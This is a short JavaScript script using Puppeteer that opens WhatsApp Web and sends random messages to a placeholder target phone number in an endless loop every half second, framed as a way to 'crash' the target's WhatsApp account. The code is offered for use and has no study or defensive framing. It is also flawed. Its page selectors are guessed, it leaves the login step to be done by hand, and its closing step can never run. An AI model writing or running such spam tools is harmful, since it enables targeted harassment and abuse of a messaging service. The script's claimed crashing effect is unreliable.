function crashWhatsAppAccount() {
  // Import required libraries
  const puppeteer = require('puppeteer');

  // Set up a new browser instance
  (async () => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    // Go to WhatsApp Web
    await page.goto('https://web.whatsapp.com/');

    // Wait for the QR code to appear
    await page.waitForSelector('canvas');

    // Scan the QR code using an existing WhatsApp account
    // You'll need to find a way to automate this part or have someone scan the code manually

    // Loop infinitely to spam the target's WhatsApp
    while (true) {
      // Enter the target's phone number
      await page.type('input[placeholder="Phone number, contact name, or message"]', 'targetPhoneNumber');

      // Type a random message
      await page.type('div[role="textbox"]', generateRandomMessage());

      // Send the message
      await page.click('button[data-icon="send"]');

      // Delay for a short while before sending the next message
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    // Close the browser
    await browser.close();
  })();
}

// Function to generate random messages
function generateRandomMessage() {
  const words = ['hello', 'world', 'this', 'is', 'a', 'test'];
  let message = '';

  for (let i = 0; i < 20; i++) {
    message += words[Math.floor(Math.random() * words.length)] + ' ';
  }

  return message;
}

crashWhatsAppAccount();
